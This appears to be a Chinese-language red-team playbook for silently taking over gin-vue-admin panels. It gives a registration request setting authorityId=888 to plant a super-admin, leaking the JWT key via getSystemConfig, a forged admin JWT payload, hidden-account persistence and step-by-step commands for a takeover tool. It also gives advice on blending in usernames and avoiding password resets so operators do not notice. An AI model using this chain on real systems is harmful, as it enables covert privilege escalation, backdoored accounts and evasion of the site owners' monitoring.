# GIN-VUE-ADMIN · 注册写 authorityId → JWT 泄露 → 静默提权 — 手法

> 笔记原图：（开源包不收个案摘记）  
> Skill：`杀招/锦府·静默`  
> 工具：`炼蛊房/ginvue_stealth_takeover.py`  
> 对照（领奖面，勿混）：`锦府·赏.md` · `ginvue_admin_probe.py`  
> 隐藏超管 SQL 范式（有库权限时）：`yudao_hidden_admin_sql.py`（芋道）；GVA 优先走 API 植入  
> **仅授权 targets**。

---

## 0. 一句话（本库采纳版）

开放注册若信任客户端 `authorityId`（常见 `888`=GVA 超管），则 **注册即植入超管账号**；再用该号打 `getSystemConfig` 抽 **JWT 签名密钥**，伪造 `ID=1`（或目标超管）JWT → **不改原 admin 密码**即可静默以超管身份作业；成功后走 **webhook/案卷通知**。  

**禁止默认学「resetPassword 改原 admin」**——登录失败告警 / 运营立刻察觉，噪声极大。

---

## 1. 原笔记链 vs 本库作业链

| 原笔记步骤 | 本库态度 |
|------------|----------|
| 注册带 `authorityId=888` | **主入口 · 保留**（本身就是植入超管） |
| `getSystemConfig` 泄 JWT 密钥 | **保留** |
| 伪造 admin（ID=1）JWT | **保留 · 静默提权首选** |
| ~~`resetPassword` 改原 admin~~ | **反模式 · 默认不做** |
| 导出用户/配置 | 授权内可做；大规模拉库先问 |
| MySQL 本机账号出现在配置 | 记证据；无主机面时勿幻想直连 `127.0.0.1` |

```text
开放注册 + 客户端可控 authorityId
        │
        ▼
① 注册低姿态超管号（authorityId=888）     ← 植入
        │
        ▼
② x-token → getSystemConfig → jwt-key     ← 密钥
        │
        ▼
③ 伪造 ID=1 / 目标超管 JWT（不改密）       ← 静默提权
        │
        ├─►（可选）setUserAuthority / 再建一个更隐蔽号
        ├─►（有主机/SQL 面）DB 植隐藏用户（仿 syscache）
        └─► notify webhook + STATUS           ← 成功通知
```

## 2. 适用指纹

| 层 | 指纹 |
|----|------|
| 框架 | gin-vue-admin / GVA；路径 `/api/base/login` `/api/user/register` `/api/user/admin_register` |
| 角色 | `authorityId`：`888` 超管、`8881` 普通等（版本可能自定义） |
| 配置 | 登录后 `POST/GET /api/system/getSystemConfig`（或 `getDict`/`getSystemState` 变体）回包含 `jwt-key` / `jwt` |
| 头 | `x-token` / `x-user-id`（GVA 经典） |
| 注册面 | 前台开放注册，或未鉴权 `admin_register` / 验证码可过 |

领奖双端口（`getConfigs`/`sendCReward`）见领奖 Playbook；**本卡打管理面接管**。

## 3. 静默优先：三种持久化（按推荐序）

### P1 — 注册即超管（植入）

```http
POST /api/user/register
Content-Type: application/json

{
  "username": "<低姿态名>",
  "password": "<自控口令>",
  "nickName": "<正常昵称>",
  "authorityId": 888,
  "enable": 1
}
```

路径变体：`/api/user/admin_register`、`/user/register`。  
成功口径：登录后 `getUserInfo` 显示 `authorityId=888` / 角色超管。

命名建议：贴近站内风格（`ops_*` / 日期工号），**避免** `adm6305…`、`Pwned@`、`Takeover` 等报告体。

### P2 — 伪造 JWT（静默提权，不改密）

1. 用 P1 Token 调 `getSystemConfig`（或配置相关 API）抽 `jwt-key`。  
2. HS256 签发载荷（字段名随版本微调）：

```json
{
  "ID": 1,
  "Username": "admin",
  "NickName": "超级管理员",
  "AuthorityId": 888,
  "BufferTime": 86400,
  "exp": <now+86400>,
  "iss": "qmPlus",
  "nbf": <now>
}
```

3. 请求头带 `x-token: <forged>`，`getUserInfo` 应对上目标超管。  
4. **到此即可作业**；勿再调 `resetPassword`。

### P3 — API 侧二次植入（仍不改原密）

有超管 Token 后优先：

| 动作 | 典型 API | 说明 |
|------|----------|------|
| 设角色 | `setUserAuthority` / `setUserAuthorities` | 把已有低权限号提成 888 |
| 建用户 | `register` / `user/admin_register` / `createUser` | 再建一个更隐蔽号 |
| 拷贝权限 | 角色菜单接口按站探索 | 比改密更难被「登录失败」发现 |

有 **本机 MySQL + 主机面** 时，再考虑 SQL 插入隐藏用户（对照芋道 `syscache` 思路）；配置里 `127.0.0.1` ** alone 不够**。

## 4. 反模式（默认禁止）

| 动作 | 为何不学进主链 |
|------|----------------|
| `resetPassword` / 改原 `admin` 口令 | 运营无法登录 → 秒级告警；审计显眼 |
| 删原超管 / 改其手机邮箱 | 同等高噪声 |
| 大面积改系统配置 banner | 易被值班发现 |
| 把 JWT 密钥、明文口令写进可公开同步文档 | 违仓库机密规则；只落案卷私有路径 |

原笔记「原 admin 新密码」仅作 **失败教学对照**：说明「能改密 ≠ 应该改密」。

## 5. 成功后通知（推荐）

闭环不只「手里有 Token」，还要 **可感知通知**：

```bash
python3 炼蛊房/ginvue_stealth_takeover.py notify \
  --case <案卷> --webhook "$OPS_WEBHOOK" \
  --title 'GVA stealth L3' \
  --body 'planted=… forged_admin=yes jwt_key=redacted'
```

| 通道 | 用法 |
|------|------|
| `--webhook` | Slack/飞书/自建；POST JSON `{title,body,case,ts}` |
| 案卷 | 始终写 `案卷/ginvue_stealth/RESULT.json` + STATUS 一句 |
| 可选 | 环境变量 `DAAIXIANZUN_NOTIFY_WEBHOOK` 作为默认 |

通知内容 **脱敏**：可含 username / authorityId / L 级；**不要**贴完整 JWT、jwt-key、DB 密码。

## 6. 复现清单（授权）

```text
① scope 确认；GVA 管理面 base（常与领奖端口分离）
② register-888：authorityId=888 注册低姿态号 → 登录拿 x-token
③ leak-config：getSystemConfig → 抽出 jwt-key（落盘 redact 版）
④ forge-admin：伪造 ID=1 JWT → getUserInfo 验证（L2）
⑤（可选）plant-authority：再植一个隐蔽号或提权已有号（L3 持久）
⑥ notify + STATUS；导出用户/全站密钥若做 → 先问规模
⑦ 明确不调用 resetPassword
```

### 成功口径

| 级 | 标准 |
|----|------|
| L0 | 开放注册或未鉴权 register；指纹 GVA |
| L1 | 注册账号 `authorityId=888` 且可登录 |
| L2 | 配置泄露 `jwt-key` **或** 伪造 admin JWT 通过 `getUserInfo` |
| L3 | 额外持久化（第二隐蔽号 / setUserAuthority / 授权 SQL 植入）且 **未改原 admin 密** |
| N1 | webhook/案卷通知已发出（脱敏） |

## 7. 探针命令

```bash
# 一键：注册植入 → 泄钥 → 伪造 admin → 通知（不改密）
python3 炼蛊房/ginvue_stealth_takeover.py chain \
  --base https://授权管理面 --case <案卷> \
  --username 'ops_cache_0811' --password '…' \
  --webhook "$OPS_WEBHOOK" --insecure

# 分步
python3 炼蛊房/ginvue_stealth_takeover.py register-888 \
  --base https://授权 --case <案卷> --username … --password …

python3 炼蛊房/ginvue_stealth_takeover.py leak-config \
  --base https://授权 --case <案卷> --token "$X_TOKEN"

python3 炼蛊房/ginvue_stealth_takeover.py forge-admin \
  --base https://授权 --case <案卷> \
  --jwt-key "$KEY" --admin-id 1 --admin-user admin

python3 炼蛊房/ginvue_stealth_takeover.py plant-authority \
  --base https://授权 --case <案卷> --token "$FORGED" \
  --target-user ops_cache_0811 --authority-id 888
```

产出：`案卷/<案卷>/案卷/ginvue_stealth/`  
敏感文件建议 `chmod 600`；完整 Token/密钥 **只进案卷**，不进 Playbook。

## 8. Triage

| 现象 | 级 | 复工条件 |
|------|----|----------|
| 开放注册且 `authorityId` 生效 | **A** | chain 到 L2；通知 |
| 注册忽略 authorityId，但配置对低权用户可读 jwt-key | **A** | 任意登录号 leak + forge |
| 注册关闭 + 配置需超管 + 无弱口令 | **B/C** | 弱口 / CORS 偷 Token / 领奖面旁路 / 主机 |
| 已有 L2 却去 resetPassword | **作业失误** | 回滚思维：改用 forge + 植入 |
